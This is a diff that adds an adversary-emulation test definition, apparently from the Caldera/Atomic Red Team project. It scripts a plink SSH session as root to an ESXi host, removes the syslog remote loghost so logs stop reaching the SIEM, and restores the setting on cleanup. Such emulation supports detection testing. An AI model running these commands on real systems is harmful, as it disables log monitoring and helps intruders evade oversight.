@@ -1,0 +1,32 @@
+---
+- id: fe825d83c01e94cde8f3c736e3802857
+  name: ESXi - Remove Syslog remote IP
+  description: 'An adversary may edit the syslog config to remove the loghost in order
+    to prevent or redirect logs being received by SIEM.
+
+    '
+  tactic: collection
+  technique:
+    attack_id: T1560.001
+    name: 'Archive Collected Data: Archive via Utility'
+  platforms:
+    windows:
+      psh:
+        command: PathToAtomicsFolder\..\ExternalPayloads\plink.exe -ssh atomic.local
+          -l root -pw n/a -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_get_loghost.txt
+          | findstr /r "[0-9]*\.[0-9]*\.[0-9]*\." > c:\temp\loghost.txt; PathToAtomicsFolder\..\ExternalPayloads\plink.exe
+          -ssh atomic.local -l root -pw n/a -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_remove_loghost.txt;
+          $inputFilePath = "c:\temp\loghost.txt"; $outputFilePath = "c:\temp\loghost_ip.txt";
+          $fileContent = Get-Content -Path $inputFilePath -Raw; if ([string]::IsNullOrWhiteSpace($fileContent))
+          {;     Write-Host "The content is $fileContent";     Write-Host "The file
+          is empty"; } else {;     $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\/\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value;     $output
+          = "esxcli system syslog config set --loghost=" + $ipAddresses;     $output
+          | Out-File -FilePath $outputFilePath -Encoding ascii;     Write-Host "IP
+          addresses extracted and saved to $outputFilePath"; }
+        payloads: []
+        cleanup: PathToAtomicsFolder\..\ExternalPayloads\plink.exe -ssh atomic.local
+          -l root -pw n/a -m c:\temp\loghost_ip.txt; rm c:\temp\loghost_ip.txt; rm
+          c:\temp\loghost.txt
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
